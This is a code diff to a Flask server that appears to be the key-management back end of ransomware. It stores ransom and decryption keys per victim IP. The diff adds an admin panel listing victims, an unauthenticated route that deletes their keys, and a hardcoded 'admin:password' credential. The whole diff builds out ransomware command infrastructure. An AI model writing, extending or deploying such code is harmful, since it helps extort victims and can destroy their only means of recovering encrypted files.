@@ -1,13 +1,16 @@
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.asymmetric import rsa
 from cryptography.hazmat.primitives import serialization
-from flask import Flask,request
+from flask import Flask,request,render_template,redirect
 import base64
 import random
 import hashlib
 
 global ransom_keys
 ransom_keys = {}
+
+global ALLOWED_USERS
+ALLOWED_USERS = {"admin":"f2d678c3dca032161b7afeae78a471260e8d68cf4d6bbd2c68741d01e27b30c7"} # admin:password
 
 global decryption_keys
 decryption_keys = {}
@@ -16,6 +19,11 @@ def hash_pass(passw):
     dk = hashlib.pbkdf2_hmac('sha256', bytes(str(base64.b64encode(bytes(passw,"utf-8"))),'utf-8'), bytes(str("qwerty"),"utf-8"), 100000)
     passwd = dk.hex()
     return passwd
+
+def hashpass(password,username):
+    string=f"${username}${password}${username}$"
+    return hash_pass(string)
+
 
 app = Flask(__name__)
 @app.route("/")
@@ -72,6 +80,38 @@ def get_hash():
         return passw
     else:
         return hash_pass(decryption_keys[request.remote_addr])
+
+@app.route("/delete_key/<int:key>/")
+def delete_key(key):
+    global ransom_keys
+    global decryption_keys
+
+    new_ransom_keys = {}
+    for i in ransom_keys.keys():
+        if i.replace(".","")!=str(key):
+            new_ransom_keys[i]=ransom_keys[i]
+    ransom_keys = new_ransom_keys
+
+    new_decryption_keys = {}
+    for i in decryption_keys.keys():
+        if i.replace(".","")!=str(key):
+            new_decryption_keys[i]=decryption_keys[i]
+    decryption_keys=new_decryption_keys
+
+    return redirect("/admin/",code=302)
+
+@app.route("/admin/",methods=["POST","GET"])
+def admin_panel():
+    global ALLOWED_USERS
+    if request.method=="GET":
+        return render_template("login.html")
+    elif request.method=="POST":
+        username = request.values.get("username")
+        password = request.values.get("password")
+        if username in ALLOWED_USERS.keys():
+            if ALLOWED_USERS[username]==hashpass(password,username):
+                return "\n".join([f"<p>{i}</p>" for i in ransom_keys.keys()])
+        return render_template("disallow.html")
 
 
 app.run(threaded=True, port=80)
